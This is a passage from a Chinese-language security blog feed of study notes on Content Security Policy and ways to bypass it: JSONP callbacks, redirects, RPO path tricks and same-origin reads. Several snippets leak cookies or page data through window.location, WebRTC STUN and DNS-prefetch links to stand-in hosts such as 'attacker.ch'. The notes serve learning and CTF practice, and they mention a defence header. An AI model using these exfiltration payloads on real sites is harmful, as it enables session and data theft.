href="https://github.com/zigoo0/JSONBee">https://github.com/zigoo0/JSONBee</a></p><p>所以真正的过滤应该是，只允许<code>a-zA-Z.</code>这些字符<br>但是这样其实也有办法可以绕过<br><a href="https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/">https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/</a><br>参考这个文章，如果某个按钮出现了问题，你可以通过获取他的元素，然后click()<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstElementChild</span>.<span class="title function_">click</span>()</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果是个jsonp，那么就是<br><a href="https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click">https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click</a></p><h1 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://localhost https://192.168.3.16/a/b/c/d&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/a/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/301.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>301.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://192.168.3.16/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>前两个因为csp策略被阻拦了，最后一个是一个允许的，并且是个重定向，但是只能重定向到csp规定的host，他只是不在看path了，但是host还是看的，如果是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://abc.com/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>还是会被拦截</p><h1 id="RPO绕过"><a href="#RPO绕过" class="headerlink" title="RPO绕过"></a>RPO绕过</h1><p>如果CSP是允许<code>https://example.com/script/abc/</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://127.0.0.1/script/abc/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;pragma&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Cache-Control&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache, must-revalidate&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;expires&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/script/abc/..%2f..%2ftest.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>那么上面的代码就可以绕过，但是这是要取决于后端服务器的处理，nginx和nodejs是可以的，其他没测试过，到时候可以看看</p><h1 id="通源类型的绕过"><a href="#通源类型的绕过" class="headerlink" title="通源类型的绕过"></a>通源类型的绕过</h1><p>如果要获取<code>http://127.0.0.1/ycb.php</code>中的内容，但是<code>ycb.php</code>有csp保护，如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这时候该网站的另一个页面存在xss，并且没有CSP的保护（或者可以绕过），就可以通过很多方法去获得这个flag</p><ol><li><p>iframe</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">iframe.<span class="property">src</span>=<span class="string">&quot;http://127.0.0.1/ycb.php&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="title function_">alert</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span>),<span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>fetch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1/ycb.php&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>)=&gt;</span><span class="title function_">alert</span>(data))</span><br></pre></td></tr></table></figure></li><li><p>window.open</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ycb = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://127.0.0.1/ycb.php&#x27;</span>)</span><br><span class="line">ycb.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(ycb.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerText</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h1 id="其他种类的绕过"><a href="#其他种类的绕过" class="headerlink" title="其他种类的绕过"></a>其他种类的绕过</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;unsafe-inline&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// any JavaScript code</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为<code>default-src &#39;none&#39;</code>的原因，<code>connect-src</code>也被设为了<code>&#39;none&#39;</code>，这时候就没法使用fetch了，那么还有什么办法</p><ol><li><p>跳转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span> <span class="comment">//这种是在当前页面跳转</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// 这种需要被攻击者确认弹窗，在UI模式下，headless不清楚</span></span><br></pre></td></tr></table></figure></li><li><p>WebRTC<br>通过dns来获取数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">    <span class="attr">iceServers</span>: [&#123;</span><br><span class="line">        <span class="attr">urls</span>: <span class="string">&quot;stun:&quot;</span> + <span class="string">&quot;7a04c2947c.ipv6.1433.eu.org:1337&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="title function_">createDataChannel</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">p.<span class="title function_">setLocalDescription</span>()</span><br></pre></td></tr></table></figure></li><li><p>DNS prefetch<br>为了让加载速度更快，浏览器可以提前去解析一些标签的host为ip，但是只限于老版本的浏览器，现在新的已经不行了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sessionid = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]+<span class="string">&quot;.&quot;</span>; </span><br><span class="line"><span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">body.<span class="property">innerHTML</span> = body.<span class="property">innerHTML</span> + <span class="string">&quot;&lt;link rel=\&quot;dns-prefetch\&quot; href=\&quot;//&quot;</span> + sessionid + <span class="string">&quot;attacker.ch\&quot;&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- firefox --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//$&#123;cookie&#125;.vps_ip&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- chrome --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//vps_ip?$&#123;cookie&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以加上这个header用来防御<br><code>X-DNS-Prefetch-Control: off</code></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;绕过csp的一些方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10316449&quot;&gt;https://ithelp.ithome.com.tw/articles/10316449&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>刷题1</title>
    <link href="http://example.com/2023/09/25/%E5%88%B7%E9%A2%981/"/>
    <id>http://example.com/2023/09/25/%E5%88%B7%E9%A2%981/</id>
    <published>2023-09-25T14:43:14.000Z</published>
    <updated>2023-09-29T08:12:35.079Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="bb772bca8816af75deb46183da65fe6048f9fd836cc8d95dbcd696be3ae1602f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码阅读</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>前端安全5-CSP（笔记）</title>
    <link href="http://example.com/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-24T03:04:11.000Z</published>
    <updated>2023-10-01T17:14:16.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为绕过的方式太多，有时候一不小心就会写出一个含有xss漏洞的代码，这时候要怎么去防御。那么就是依靠CSP进行防御了</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10315612">https://ithelp.ithome.com.tw/articles/10315612</a><span id="more"></span><h2 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h2>网页要加上CSP策略有3种方法</li><li>HTTP Respond header加上 Content-Security-Policy</li><li>加上<code>meta</code>标签</li><li><h3 style="text-decoration: line-through;">iframe标签，在本章不讲</h3></li></ul><p>先看个简单的案例<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;none&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>上面的html并不会有弹窗，因为被csp策略阻止了<br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br><code>script-src &#39;none&#39;</code>的意思就是禁止任何脚本执行，包括</p><h2 id="CSP规则"><a href="#CSP规则" class="headerlink" title="CSP规则"></a>CSP规则</h2><p>在上面的例子就用了<code>script-src &#39;none&#39;</code>导致了任何的脚本都不会被执行，包括onerror那些<br><code>default-src</code>就是预设的指示，如果某个指示，例如<code>script-src</code>没有设置任何规则，那么就会使用<code>default-src</code>的规则。<br>但是有几个是不会使用<code>default-src</code>的内容的，如下</p><ul><li>base-uri</li><li>form-action</li><li>frame-ancestors</li><li>report-uri</li><li>sandbox</li></ul><p>详细内容请看<br><a href="https://content-security-policy.com/default-src/">https://content-security-policy.com/default-src/</a></p><p>还有其他的指示，我这里直接使用huli佬的<br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>下面两个链接是官方文档</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li><li><a href="https://content-security-policy.com">https://content-security-policy.com</a></li></ul><p>当然，每个指示都会有相应的规则，那么一般使用哪些规则呢，我这里也偷懒直接用huli佬的截图</p><p><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt></p><p>例如<code>script-src *</code>就相当于允许除了<code>data:</code>,<code>blob:</code>，还有<code>file:</code>,demo如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src *&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">test.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>但是直接运行的话，就像下面的代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src *&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p><p>这种直接运行的还是不行。只能用加载js的方式<code>&lt;script src=xxx&gt;</code>。<br>想直接运行代码，还是得用<code>unsafe-inline</code></p><h3 id="script-src-规则"><a href="#script-src-规则" class="headerlink" title="script-src 规则"></a>script-src 规则</h3><h4 id="unsafe-inline"><a href="#unsafe-inline" class="headerlink" title="unsafe-inline"></a>unsafe-inline</h4><p>允许执行inline js<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="unsafe-eval"><a href="#unsafe-eval" class="headerlink" title="unsafe-eval"></a>unsafe-eval</h4><p>前一个策略允许执行js代码，但是不会运行动态执行js代码，也就是说<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"><span class="title class_">Function</span>(<span class="string">&#x27;&#x27;</span>)()</span><br></pre></td></tr></table></figure><br>类似这些<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;</span><span class="comment">&lt;!-- 仍然需要unsafe-inline，不然不能执行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="nonce-xxx"><a href="#nonce-xxx" class="headerlink" title="nonce-xxx"></a>nonce-xxx</h4><p>允许<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 